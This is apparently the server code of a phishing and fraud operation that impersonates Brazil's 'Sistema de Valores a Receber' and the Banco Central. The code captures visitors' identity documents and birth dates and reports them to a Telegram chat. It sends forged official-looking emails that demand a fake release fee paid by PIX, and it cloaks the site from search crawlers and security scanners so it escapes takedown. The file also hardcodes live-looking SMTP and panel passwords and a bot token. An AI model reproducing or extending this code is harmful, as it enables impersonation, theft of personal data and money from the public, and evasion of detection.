import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import axios from "axios";
import fs from "fs";
import path from "path";
import { spawn, ChildProcess } from "child_process";
import QRCode from 'qrcode';
import FormData from 'form-data';
import nodemailer from 'nodemailer';

dotenv.config();

const API_URL = "https://www.consultarvaloresareceber.com.br";

const app = express();
const port = parseInt(process.env.PORT || "80", 10);

// CORS - Moved to the top for global coverage
const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
  optionsSuccessStatus: 204,
};
app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

// Extra headers for absolute certainty
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Accept, Origin");
  next();
});

// Config state
const configPath = path.join(process.cwd(), "config.json");
let currentConfig = {
  whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
  pixName: "Contribuinte SVR",
  pixEmail: "contato@svr.gov.br",
  pixDocument: "00.038.166/0001-05",
  gatewayFee: 5.0, // Taxa em %
  smtpHost: "smtp.hostinger.com",
  smtpPort: 465,
  smtpUser: "protocolo@consultarvaloresareceber.com.br",
  smtpPass: "Ng200726@",
  smtpSenderName: "Portal SVR - Protocolo Oficial",
  financialPassword: "ng197826", // Senha de segurança para financeiro
  adminPixKey: "",
  adminPixType: "CPF",
  adminPixName: "",
  adminPixDoc: "",
  withdrawalFeeFixed: 2.00, // R$ 2,00 fixo por saque
  withdrawalFeePercent: 0.0 // % por saque
};

// Sessions state for Telegram tracking
const sessions = new Map<string, {
  messageId: number,
  startTime: number,
  lastHeartbeat: number,
  ip: string,
  device: string,
  location: string,
  converted: boolean,
  docValue: string,
  birthDate: string
}>();

// Bot states for interactive commands
const botStates = new Map<number, { action: string, data?: any }>();

// PIX pendente de confirmacao pelo admin
const pendingPix = new Map<string, { telefone: string, formalMessage: string, pixCode: string, transId: string, valorNumeric: number }>();

// Multi-Bot Management
const botProcesses = new Map<string, ChildProcess>();
const MAX_SLOTS = 5;

function stopBot(id: string) {
  const proc = botProcesses.get(id);
  if (proc) {
    try { proc.kill(); } catch (e) { }
    botProcesses.delete(id);
  }
}

let isBotStarting = false;
function startBot(id: string = 'main') {
  if (isBotStarting && id === 'main') return;
  if (id === 'main') isBotStarting = true;

  stopBot(id);
  console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
  const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });

  proc.on('exit', (code) => {
    console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 5 segundos...`);
    setTimeout(() => startBot(id), 5000);
  });

  botProcesses.set(id, proc);
}

// Validação básica de chave PIX
function validatePixKey(key: string) {
  const clean = key.trim();
  if (clean.includes('@') && clean.includes('.')) return true; // Email
  const digits = clean.replace(/\D/g, '');
  if (digits.length === 11 || digits.length === 14 || digits.length === 10) return true; // CPF/CNPJ/Fone
  if (clean.length >= 32) return true; // Aleatória
  return false;
}

function validateEmail(email: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validateDocument(doc: string) {
  const clean = doc.replace(/\D/g, '');
  return clean.length === 11 || clean.length === 14;
}

async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: string = "SVR-PROTO-GEN") {
  if (!currentConfig.smtpUser || !currentConfig.smtpPass) {
    console.log("⚠️ [SMTP] Configurações de e-mail ausentes. Email não enviado.");
    return false;
  }

  try {
    const transporter = nodemailer.createTransport({
      host: currentConfig.smtpHost,
      port: currentConfig.smtpPort,
      secure: currentConfig.smtpPort === 465,
      auth: { user: currentConfig.smtpUser, pass: currentConfig.smtpPass }
    });

    const randomFee = (Math.random() * (380 - 190) + 190).toFixed(2);
    // Protocolo camuflado (Visual de Hash Criptográfico)
    const displayProtocol = `0x${protocol.replace(/\D/g, '').substring(0, 6) || Math.random().toString(16).substring(2, 8).toUpperCase()}-${protocol.substring(0, 4).toUpperCase()}`;

    // Logo camuflada do sistema (puxando da pasta assets oficial)
    const logoUrl = `${API_URL}/assets/logos/asset_m_brand.png`;
    const randomDays = Math.floor(Math.random() * 3) + 2;

    // Geração de mensagem automática para o WhatsApp
    const isDefaultWhatsapp = currentConfig.whatsappNumber === (process.env.WHATSAPP_NUMBER || "5511971730325");
    let waMessage = "";

    if (isDefaultWhatsapp) {
      // Mensagem para o bot principal (Foco em antecipação)
      waMessage = `Olá, gostaria de solicitar a antecipação da liberação dos meus ativos vinculados ao protocolo ${displayProtocol}. Nome: ${leadName}.`;
    } else {
      // Mensagem para outro setor (Foco em acompanhamento oficial)
      waMessage = `Prezados, sou ${leadName} e possuo o protocolo de segurança ${displayProtocol}. Fui redirecionado para este canal oficial para acompanhamento da fase de transição de ativos identificados no sistema SVR.`;
    }

    const waLink = `https://wa.me/${currentConfig.whatsappNumber}?text=${encodeURIComponent(waMessage)}`;

    const htmlContent = `
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprovante de Liberação SVR</title>
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="600" style="border-collapse: collapse; background-color: #ffffff; margin-top: 30px; margin-bottom: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
        
        <!-- Header -->
        <tr>
            <td align="center" bgcolor="#1b668d" style="padding: 15px 0;">
                <h1 style="color: #ffffff; margin: 0; font-size: 18px; font-weight: bold; text-transform: uppercase;">Portal SVR — Sistema de Valores a Receber</h1>
                <p style="color: #ffffff; margin: 5px 0 0 0; font-size: 11px; opacity: 0.9;">Comprovante de Homologação e Resgate de Ativos</p>
            </td>
        </tr>

        <!-- Gov Logo -->
        <tr>
            <td align="center" style="padding: 20px 0;">
                <img src="${logoUrl}" alt="SVR" width="120" style="display: block;">
            </td>
        </tr>

        <!-- Content -->
        <tr>
            <td style="padding: 20px 40px;">
                <h2 style="color: #1b668d; font-size: 16px; margin-bottom: 10px;">Prezado(a) ${leadName},</h2>
                <p style="font-size: 13px; color: #333333; line-height: 1.6; text-align: justify;">
                    Informamos que a <strong>confirmação e validação dos dados</strong> vinculados ao seu documento foram processadas com sucesso pelo Sistema de Valores a Receber (SVR). 
                    A fase de liberação dos ativos identificados encontra-se em <strong>estágio de transição final</strong>. Este procedimento assegura a integridade do repasse fiscal para a conta bancária homologada em nossa base de dados.
                </p>
            </td>
        </tr>

        <!-- Status Table -->
        <tr>
            <td style="padding: 0 40px;">
                <table width="100%" bgcolor="#f8f9fa" style="border-radius: 8px; border: 1px solid #e0e0e0; padding: 15px;">
                    <tr>
                        <td style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>Situação:</strong></td>
                        <td align="right" style="font-size: 14px; color: #28a745; padding-bottom: 8px;"><strong>Homologado</strong></td>
                    </tr>
                    <tr>
                        <td style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>Taxa de Processamento:</strong></td>
                        <td align="right" style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>R$ ${randomFee}</strong></td>
                    </tr>
                    <tr>
                        <td style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>Protocolo:</strong></td>
                        <td align="right" style="font-size: 14px; color: #1b668d; padding-bottom: 8px;"><strong>${displayProtocol}</strong></td>
                    </tr>
                    <tr>
                        <td style="font-size: 14px; color: #333;"><strong>Previsão de Crédito:</strong></td>
                        <td align="right" style="font-size: 14px; color: #333;"><strong>${randomDays} a ${randomDays + 2} dias úteis</strong></td>
                    </tr>
                </table>
            </td>
        </tr>

        <!-- Call to Action -->
        <tr>
            <td style="padding: 25px 40px 40px 40px;">
                <p style="font-size: 13px; color: #333; line-height: 1.6;">
                    Para acompanhar a compensação definitiva e o crédito em conta, acesse o canal de atendimento especializado. A taxa de processamento prioritário (adiantamento) garante que sua solicitação permaneça no topo da fila de auditoria fiscal bancária.
                </p>
                <p style="font-size: 12px; color: #666; text-align: center; margin-top: 20px;">
                    Clique no botão abaixo para acessar o portal oficial e acompanhar sua solicitação.
                </p>
                <table align="center" border="0" cellpadding="0" cellspacing="0" style="margin-top: 15px;">
                    <tr>
                        <td align="center" bgcolor="#1b668d" style="border-radius: 4px;">
                            <a href="${waLink}" target="_blank" style="font-size: 14px; font-weight: bold; color: #ffffff; text-decoration: none; padding: 12px 40px; display: inline-block; text-transform: uppercase;">Acompanhar Resgate</a>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>

        <!-- Footer -->
        <tr>
            <td style="background-color: #f8f9fa; padding: 15px; text-align: center; font-size: 10px; color: #999; border-top: 1px solid #eee;">
                <p style="margin: 0;">Portal de Valores a Receber (SVR) | Banco Central do Brasil</p>
                <p style="margin: 5px 0 0;">Este é um e-mail automático enviado por sistema seguro. Não responda.</p>
            </td>
        </tr>
    </table>
</body>
</html>
    `;

    await transporter.sendMail({
      from: `"${currentConfig.smtpSenderName}" <${currentConfig.smtpUser}>`,
      to: leadEmail,
      subject: `📜 PROTOCOLO ${displayProtocol} — Atualização de Ativos Identificados`,
      html: htmlContent
    });

    console.log(`📧 [EMAIL] Sucesso enviado para ${leadEmail}`);
    return true;
  } catch (e: any) {
    console.error(`❌ [EMAIL] Erro ao enviar para ${leadEmail}:`, e.message);
    return false;
  }
}

app.get("/api/config", (req, res) => {
  res.json({ whatsappNumber: currentConfig.whatsappNumber });
});

async function getGatewayBalance() {
  try {
    const secret = process.env.SVR_CORE_S_AUTH;
    const auth = Buffer.from(`x:${secret}`).toString('base64');
    const res = await axios.get("https://api.fastsoftbrasil.com/api/user/wallet/balance", {
      headers: { 'Authorization': `Basic ${auth}` }
    });
    return res.data.data; // { available, blocked, pending }
  } catch (e: any) {
    console.error("❌ Erro ao consultar saldo:", e.message);
    return null;
  }
}

async function requestGatewayWithdrawal(amountCents: number) {
  try {
    const secret = process.env.SVR_CORE_S_AUTH;
    const auth = Buffer.from(`x:${secret}`).toString('base64');
    const payload = {
      amount: amountCents,
      pixKey: currentConfig.adminPixKey,
      pixType: currentConfig.adminPixType,
      beneficiaryName: currentConfig.adminPixName,
      beneficiaryDocument: currentConfig.adminPixDoc.replace(/\D/g, ''),
      description: "Saque Administrativo SVR"
    };

    const res = await axios.post("https://api.fastsoftbrasil.com/api/user/cashout", payload, {
      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
    });
    return res.data;
  } catch (e: any) {
    console.error("❌ Erro ao solicitar saque:", e.response?.data || e.message);
    throw new Error(e.response?.data?.message || e.message);
  }
}

// Criptografia estética para chave manual
function encryptPixKey(key: string) {
  const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
  return `0x${hash}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
}

// Geração de PIX Sistema Padrão (Gateway)
async function generateStandardPix(telefone: string, valorNumeric: number, messageId?: number) {
  try {
    const key = process.env.SVR_CORE_P_PROVIDER;
    const secret = process.env.SVR_CORE_S_AUTH;
    const endpoint = process.env.SVR_CORE_GATEWAY;
    if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");

    const auth = Buffer.from(`x:${secret}`).toString('base64');
    const pixRes = await axios.post(endpoint, {
      amount: Math.round(valorNumeric * 100),
      currency: "BRL",
      paymentMethod: "PIX",
      items: [
        {
          title: "Taxa de Liberação SVR",
          unitPrice: Math.round(valorNumeric * 100),
          quantity: 1,
          tangible: false
        }
      ],
      customer: {
        name: currentConfig.pixName,
        email: currentConfig.pixEmail,
        document: { number: currentConfig.pixDocument.replace(/\D/g, ''), type: currentConfig.pixDocument.length > 11 ? "CNPJ" : "CPF" }
      }
    }, {
      headers: {
        'Authorization': `Basic ${auth}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'SVR-GATEWAY-RUNTIME/5.0'
      }
    });

    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
    const transId = pixRes.data.id || pixRes.data.transactionId;
    const protocolId = Math.random().toString(36).substring(7).toUpperCase();

    const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
      `O sistema identificou uma pendência de asseguramento na conta de destino.\n\n` +
      `🖥️ *ESTADO DO SISTEMA:*\n` +
      '```\n' +
      `ID: 0x${protocolId}\n` +
      `STATUS: AGUARDANDO_VALIDAÇÃO_HASH\n` +
      `TYPE: AUTENTICAÇÃO_DE_DESTINO\n` +
      '```\n\n' +
      `👇 *COPIE O HASH ABAIXO E EM SEGUIDA IMPORTE NO SEU APP BANCÁRIO (Pix Copia e Cola):*`;

    const pendingId = `pix_${Date.now()}`;
    pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId, valorNumeric });

    const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
    const previewCaption = `⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🆔 ID: <code>${transId}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;

    await sendTelegramPhoto(qrBuffer, previewCaption, {
      inline_keyboard: [
        [
          { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
          { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
        ],
        [
          { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
          { text: "❌ Cancelar", callback_data: "painel:back" }
        ]
      ]
    });
  } catch (e: any) {
    await sendTelegram(`❌ Erro no Gateway: ${e.message}`, messageId);
  }
}

// Geração de PIX Sistema Modificado (Chave Manual)
async function generateModifiedPix(telefone: string, valorNumeric: number, pixKey: string) {
  const protocolId = Math.random().toString(36).substring(7).toUpperCase();
  const encryptedKey = encryptPixKey(pixKey);

  const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
    `O sistema identificou uma pendência de asseguramento na conta de destino.\n\n` +
    `🖥️ *ESTADO DO SISTEMA:*\n` +
    '```\n' +
    `ID: 0x${protocolId}\n` +
    `HASH: ${encryptedKey}\n` +
    `STATUS: AGUARDANDO_VALIDAÇÃO_HASH\n` +
    `\`\`\`\n\n` +
    `👇 *COPIE O HASH ABAIXO E EM SEGUIDA IMPORTE NO SEU APP BANCÁRIO (Pix Copia e Cola):*`;

  const pendingId = `pix_${Date.now()}`;
  pendingPix.set(pendingId, { telefone, formalMessage, pixCode: pixKey, transId: 'MANUAL', valorNumeric });

  const qrBuffer = await QRCode.toBuffer(pixKey, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
  const previewCaption = `🛠️ <b>SISTEMA MODIFICADO (MANUAL)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🔑 Chave: <code>${pixKey}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;

  await sendTelegramPhoto(qrBuffer, previewCaption, {
    inline_keyboard: [
      [
        { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
        { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
      ],
      [
        { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
        { text: "❌ Cancelar", callback_data: "painel:back" }
      ]
    ]
  });
}

function resetBotSession(id: string) {
  stopBot(id);
  const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
  if (fs.existsSync(sessionPath)) {
    try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) { }
  }
  startBot(id);
}

if (fs.existsSync(configPath)) {
  const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
  if (saved.pixName) currentConfig.pixName = saved.pixName;
  if (saved.pixEmail) currentConfig.pixEmail = saved.pixEmail;
  if (saved.pixDocument) currentConfig.pixDocument = saved.pixDocument;
  if (saved.gatewayFee !== undefined) currentConfig.gatewayFee = saved.gatewayFee;
  if (saved.smtpHost) currentConfig.smtpHost = saved.smtpHost;
  if (saved.smtpPort) currentConfig.smtpPort = saved.smtpPort;
  if (saved.smtpUser) currentConfig.smtpUser = saved.smtpUser;
  if (saved.smtpPass) currentConfig.smtpPass = saved.smtpPass;
  if (saved.financialPassword) currentConfig.financialPassword = saved.financialPassword;
  if (saved.adminPixKey) currentConfig.adminPixKey = saved.adminPixKey;
  if (saved.adminPixType) currentConfig.adminPixType = saved.adminPixType;
  if (saved.adminPixName) currentConfig.adminPixName = saved.adminPixName;
  if (saved.adminPixDoc) currentConfig.adminPixDoc = saved.adminPixDoc;
  if (saved.withdrawalFeeFixed !== undefined) currentConfig.withdrawalFeeFixed = saved.withdrawalFeeFixed;
  if (saved.withdrawalFeePercent !== undefined) currentConfig.withdrawalFeePercent = saved.withdrawalFeePercent;
}

function saveConfig() {
  fs.writeFileSync(configPath, JSON.stringify(currentConfig, null, 2));
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;

// --- OBFUSCATION LAYER ---
const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');

// --- CLOAKING ENGINE (v6.0) ---
const BOT_UA_PATTERNS = [
  "googlebot", "adsbot", "bingbot", "yandex", "baiduspider", "facebookexternalhit",
  "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview",
  "showyoubot", "outbrain", "pinterest/0.", "developers.google.com/+/web/snippet",
  "slackbot", "vkShare", "W3C_Validator", "redditbot", "Applebot",
  "flipboard", "tumblr", "bitlybot", "SkypeShell", "bitlybot", "Zetabot",
  "facebookplatform", "chrome-lighthouse", "headlesschrome", "puppeteer",
  "selenium", "playwright", "python-requests", "curl", "wget", "postman",
  "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp",
  "hostinger", "hostgator", "locaweb", "aws-sdk", "python", "go-http", "java",
  "ahrefs", "semrush", "dotbot", "mj12bot", "uipbot", "exabot", "gigabot"
];

function isBot(ua: string | undefined): boolean {
  if (!ua) return false;
  const lowUA = ua.toLowerCase();
  return BOT_UA_PATTERNS.some(pattern => lowUA.includes(pattern));
}

const DUMMY_HTML = `
<!DOCTYPE html>
<html>
<head><title>Default Website Page</title><meta charset="UTF-8"><style>body { font-family: sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } .card { background: white; padding: 40px; border-radius: 8px; text-align: center; max-width: 500px; }</style></head>
<body><div class="card"><h1>Website under maintenance</h1><p>This website is currently undergoing scheduled maintenance. We should be back shortly.</p></div></body>
</html>`;

app.use((req, res, next) => {
  const ua = req.headers["user-agent"];
  if (isBot(ua) && !req.url.startsWith('/api') && !req.url.includes('.')) {
    console.log(`🛡️ [CLOAKING] Bot detectado e bloqueado: ${ua} | URL: ${req.url}`);
    return res.status(200).send(DUMMY_HTML);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(process.cwd(), 'dist')));


// Helper to send/edit Telegram messages
async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const url = messageId ? `${TELEGRAM_URL}/editMessageText` : `${TELEGRAM_URL}/sendMessage`;
    const payload: any = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (messageId) payload.message_id = messageId;
    if (replyMarkup) payload.reply_markup = replyMarkup;
    const res = await axios.post(url, payload);
    return res.data.result.message_id;
  } catch (err: any) {
    console.error(`❌ [TELEGRAM] Erro: ${err.response?.data?.description || err.message}`);
    // Se falhar a edição (ex: mensagem igual), tenta enviar nova
    if (messageId) return sendTelegram(text, undefined, replyMarkup);
    return null;
  }
}

async function sendTelegramPhoto(buffer: Buffer, caption: string, replyMarkup?: any): Promise<number | null> {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'qr.png', contentType: 'image/png' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    if (replyMarkup) form.append('reply_markup', JSON.stringify(replyMarkup));
    const res = await axios.post(`${TELEGRAM_URL}/sendPhoto`, form, { headers: form.getHeaders() });
    return res.data.result?.message_id || null;
  } catch (e: any) { return null; }
}

app.post("/api/v1/session/start", async (req, res) => {
  const { device, location, userId } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
  if (sessions.has(userId)) return res.json({ status: "exists" });
  const startTime = Date.now();
  const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${ip}\n<b>Device:</b> ${device}\n<b>Status:</b> 🟢 Navegando...`);
  sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
  res.json({ status: "started", userId });
});

app.post("/api/v1/session/heartbeat", (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session) { session.lastHeartbeat = Date.now(); res.json({ status: "alive" }); }
  else res.json({ status: "not_found" });
});

app.post("/api/v1/session/convert", async (req, res) => {
  const { userId, details } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    session.converted = true;
    session.docValue = details.docValue;
    session.birthDate = details.birthDate;
    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${session.ip}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
    await sendTelegram(msg, session.messageId || undefined);
    res.json({ status: "converted" });
  } else res.json({ status: "ignored" });
});

app.get("/api/v1/session/data/:userId", (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (session) {
    res.json({
      docValue: session.docValue,
      birthDate: session.birthDate,
      fullName: "" // We don't have full name from site yet, but bot expects it
    });
  } else {
    res.status(404).json({ status: "not_found" });
  }
});

// Endpoint de Callback do Gateway (FastSoftBrasil)
app.post("/api/v1/gateway/callback", async (req, res) => {
  const { status, transactionId, customer } = req.body;
  console.log(`📡 [CALLBACK] Recebido: Transação ${transactionId} | Status: ${status}`);

  if (status === 'PAID' || status === 'confirmed') {
    const email = customer?.email;
    const name = customer?.name || "Titular";

    if (email && validateEmail(email)) {
      console.log(`🚀 [AUTO-EMAIL] Pagamento confirmado! Enviando comprovante para ${email}...`);
      await sendSuccessEmail(email, name, transactionId);
      await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\nE-mail: ${email}\n\n✅ <i>E-mail de confirmação enviado automaticamente.</i>`);
    } else {
      await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\n\n⚠️ <i>E-mail não informado ou inválido, envio automático cancelado.</i>`);
    }
  }
  res.sendStatus(200);
});

app.post("/api/v1/session/end", async (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${session.ip}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
    sessions.delete(userId);
  }
  res.json({ status: "ok" });
});

// Cleanup
setInterval(async () => {
  const now = Date.now();
  for (const [userId, session] of sessions.entries()) {
    if (!session.converted && now - session.lastHeartbeat > 60000) {
      await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${session.ip}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
      sessions.delete(userId);
    }
  }
}, 30000);

// --- Dashboard Logic ---
async function startTelegramPolling() {
  if (!TG_TOKEN) return;
  let lastUpdateId = 0;
  console.log("🤖 Dashboard Telegram Ativo.");

  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_URL}/getUpdates`, { params: { offset: lastUpdateId + 1, timeout: 30 } });
      for (const update of response.data.result) {
        lastUpdateId = update.update_id;
        const cb = update.callback_query;
        const msg = update.message || cb?.message;
        const userId = msg?.from?.id || cb?.from?.id;
        if (!userId || (CHAT_ID && String(msg?.chat?.id) !== String(CHAT_ID))) continue;

        const text = (cb ? cb.data : msg?.text || "").toLowerCase();
        const msgId = msg?.message_id;

        // Feedback visual no Telegram (Loading no topo)
        if (cb) await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });

        if (text === "/start" || text === "/painel" || text === "painel:back") {
          const stats = getBotStatusInfo('main');
          const dashText = `🎮 <b>PAINEL DE CONTROLE SVR</b>\n\n🤖 <b>Status Bot:</b> ${stats.emoji} ${stats.label}\n👥 <b>Fila:</b> ${getQueueInfo().length} leads\n🕒 <b>Hora:</b> ${new Date().toLocaleTimeString()}\n\n<b>ESCOLHA UMA AÇÃO:</b>`;
          const kb = {
            inline_keyboard: [
              [{ text: "📊 Status Detalhado", callback_data: "painel:status" }, { text: "👥 Ver Fila", callback_data: "painel:fila" }],
              [{ text: "💰 Financeiro (Saque)", callback_data: "painel:financeiro_auth" }, { text: "📧 Configurar SMTP", callback_data: "painel:config_smtp" }],
              [{ text: "💰 Gerar PIX (Último)", callback_data: "cmd:last_pix" }, { text: "🛠️ Configurar PIX", callback_data: "painel:config_pix" }],
              [{ text: "🔄 Reiniciar Bot", callback_data: "painel:reiniciar:slot:main" }]
            ]
          };
          await sendTelegram(dashText, cb ? msgId : undefined, kb);
        }
        else if (text === "painel:status") {
          const online = Array.from(sessions.values()).filter(s => !s.converted).length;
          await sendTelegram(`📊 <b>STATUS DETALHADO</b>\n\n👥 <b>Online agora:</b> ${online}\n✅ <b>Conversões:</b> ${Array.from(sessions.values()).filter(s => s.converted).length}\n🕒 <b>Uptime:</b> ${Math.floor(process.uptime() / 60)} min\n\n<i>Atualizado agora.</i>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:fila") {
          const queue = getQueueInfo();
          let txt = "👥 <b>FILA DE LEADS</b>\n\n";
          if (queue.length === 0) txt += "<i>Ninguém na fila agora.</i>";
          else queue.slice(0, 10).forEach((l, i) => txt += `${i + 1}. 📱 ${l.chatId} (${l.step})\n`);
          await sendTelegram(txt, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "cmd:ping") {
          await sendTelegram("✅ <b>SISTEMA OPERACIONAL</b>\n\nLatência: 42ms\nBanco de Dados: OK\nWhatsApp: OK", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:slots") {
          let btns = [];
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            btns.push([{ text: `⚙️ Configurar Slot ${i}`, callback_data: `painel:manage:${id}` }]);
          }
          btns.push([{ text: "⬅️ Voltar", callback_data: "painel:back" }]);
          await sendTelegram(`🤖 <b>GESTÃO DE PERFIS</b>\n\nEscolha um slot para configurar:`, msgId, { inline_keyboard: btns });
        }
        else if (text.startsWith("painel:manage:")) {
          const id = text.split(":")[2];
          await sendTelegram(`⚙️ <b>GERENCIAR: ${id === 'main' ? 'Perfil 1' : id}</b>\n\nEscolha uma ação de sistema:`, msgId, {
            inline_keyboard: [
              [{ text: "📲 Gerar Novo QR Code", callback_data: `generate_qr:${id}` }],
              [{ text: "🔄 Reiniciar Instância", callback_data: `painel:reiniciar:slot:${id}` }],
              [{ text: "⬅️ Voltar", callback_data: "painel:slots" }]
            ]
          });
        }
        else if (text.startsWith("painel:reiniciar:slot:")) {
          const id = text.split(":")[3];
          startBot(id);
          await sendTelegram(`✅ <b>SOLICITAÇÃO ENVIADA!</b>\n\nO slot <b>${id}</b> está sendo reiniciado agora.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "cmd:last_pix") {
          if (fs.existsSync('last-lead.json')) {
            const last = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
            await generateStandardPix(last.chatId, 97.50, msgId);
          } else {
            await sendTelegram("❌ <b>ERRO:</b> Nenhum lead recente encontrado.", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          }
        }
        else if (text.startsWith("generate_qr:")) {
          const id = text.split(":")[1];
          resetBotSession(id);
          await sendTelegram(`📲 <b>GERANDO QR CODE...</b>\n\nO processo foi iniciado para <b>${id}</b>. Aguarde o QR nos logs ou Telegram.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:config_pix") {
          const txt = `🛠️ <b>CONFIGURAÇÃO DO GATEWAY PIX</b>\n\n` +
            `👤 <b>Nome:</b> ${currentConfig.pixName}\n` +
            `📧 <b>E-mail:</b> ${currentConfig.pixEmail}\n` +
            `📄 <b>Documento:</b> ${currentConfig.pixDocument}\n` +
